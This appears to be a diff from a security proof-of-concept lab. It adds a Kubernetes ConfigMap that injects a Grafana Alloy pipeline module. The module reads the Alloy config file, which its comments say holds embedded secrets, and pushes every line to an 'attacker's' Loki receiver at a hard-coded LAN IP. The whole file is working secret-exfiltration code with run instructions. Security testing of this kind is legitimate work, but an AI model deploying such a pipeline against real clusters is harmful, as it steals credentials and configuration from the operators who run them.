@@ -1,0 +1,35 @@
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: user-pipeline
+  namespace: monitoring
+data:
+  # Demo: exfiltrate /etc/alloy/config.alloy (which contains SECRET_1 via env
+  # var and the full pipeline config) to the attacker's local loki receiver.
+  #
+  # Run: task deploy:security-poc:flag1-demo
+  # Then in a separate terminal: task run:security-poc-loki-receiver
+  #
+  # TIMESTAMP is replaced with $(date +%s) by the task on every apply,
+  # giving each run a unique positions-file key so the file is always re-read.
+  module.alloy: |
+    declare "user_pipeline" {
+      // Read the Alloy main config file. It contains the full pipeline config
+      // and any secrets baked in via env var references or extraEnv values.
+      loki.source.file "exfil" {
+        targets = [{
+          __path__ = "/etc/alloy/config.alloy",
+          job      = "alloy-config-TIMESTAMP",
+        }]
+        forward_to = [loki.write.exfil.receiver]
+      }
+
+      // Ship every line to the attacker's local receiver.
+      // host.docker.internal is NOT injected into kind pod /etc/hosts on macOS;
+      // use the Mac's LAN IP instead (reachable via the Docker bridge route).
+      loki.write "exfil" {
+        endpoint {
+          url = "http://192.168.0.154:3100/loki/api/v1/push"
+        }
+      }
+    }
